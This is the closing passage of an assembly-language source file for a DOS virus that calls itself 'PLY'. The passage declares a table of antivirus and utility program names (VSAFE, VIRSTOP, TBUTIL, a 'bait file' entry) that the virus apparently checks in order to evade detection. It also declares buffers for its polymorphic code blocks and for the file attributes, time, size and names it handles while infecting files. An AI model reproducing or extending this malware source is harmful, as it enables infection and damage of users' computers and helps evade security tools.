            db      07h,'TBUTIL.'       ; TbUtil
            db      09h,'VALIDATE.'     ; VALIDATE
            db      08h,'VIRSTOP.'      ; VIRSTOP
            db      05h,'VIRUS'         ; Bait file
            db      05h,'VPIC.'         ; Picture file viewer
            db      06h,'VSAFE.'        ; VSafe
            db      00h
   table_end:
            db      00h,00h
   _ncdtree     db      '\NCDTREE',00h
            db      'PLY'               ; Name of the virus
   poly_blocks  db       (poly_end-poly_begin)/03h dup(90h,90h,04h dup(?))
   code_end:
   dta:
            db      15h dup(?)      ; Used by DOS for find next-process
   file_attr    db      ?           ; File attribute
   file_time    dw      ?           ; File time
   file_date    dw      ?           ; File date
   filesize     dd      ?           ; Filesize
   filename     db      0dh dup(?)      ; Filename
   data_end:

   end      code_begin
